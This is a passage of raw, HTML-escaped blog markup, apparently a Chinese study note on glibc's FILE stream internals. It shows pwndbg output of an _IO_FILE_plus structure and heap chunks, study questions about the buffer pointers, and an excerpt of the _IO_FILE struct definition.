class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *)&lt;span class=&#34;number&#34;&gt;0x804c410&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72538984&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x804d570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0xf7fb7cc0&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x804c4a8&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x804c4b4&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;39&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0xf7fb6ac0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804c000&lt;/span&gt; PREV_INUSE &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;1033&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0x74730a32&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0x7478742e&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804c408&lt;/span&gt; PREV_INUSE &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;353&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0xfbad2498&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804c568&lt;/span&gt; PREV_INUSE &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;4105&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0xa6161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q1:_IO_read_ptr 等几个指针有神吗作用？&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;分别对应什么函数功能？为什么修改后，fread 不起作用了&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q2:IO_buf_end -_IO_buf_base = 0x1000 为什么偏移量是 0x1000&lt;/strong&gt;&lt;/em&gt;，内容堆块大小为 0x1008&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;分析__io_file_plusneide一些内容&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分析__io_file_plusneide一些内容&#34;&gt;#&lt;/a&gt; 分析 ——__IO_FILE_plusneide 一些内容&lt;/h3&gt;
&lt;p&gt;_flags FILE 结构体的一些状态；_markers 为指向 markers 结构体的指针变量，为一个单向链表结构，存放流的位置；_chain 变量为一个链表的指针，进程中创建的 FILE 结构体会通过这个变量连成一个单向链表；&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*_IO_FILE结构体*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* libio/libio.h */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _flags;       &lt;span class=&#34;comment&#34;&gt;/* High-order word is _IO_MAGIC; rest is flags. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; _IO_file_flags _flags&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* The following pointers correspond to the C++ streambuf protocol. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_read_ptr;   &lt;span class=&#34;comment&#34;&gt;/* Current read pointer */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_read_end;   &lt;span class=&#34;comment&#34;&gt;/* End of get area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_read_base;  &lt;span class=&#34;comment&#34;&gt;/* Start of putback+get area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_write_base; &lt;span class=&#34;comment&#34;&gt;/* Start of put area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_write_ptr;  &lt;span class=&#34;comment&#34;&gt;/* Current put pointer. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_write_end;  &lt;span class=&#34;comment&#34;&gt;/* End of put area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_buf_base;   &lt;span class=&#34;comment&#34;&gt;/* Start of reserve area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* _IO_buf_end;    &lt;span class=&#34;comment&#34;&gt;/* End of reserve area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* The following fields are used to support backing up and undo. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *_IO_save_base; &lt;span class=&#34;comment&#34;&gt;/* Pointer to start of non-current get area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span 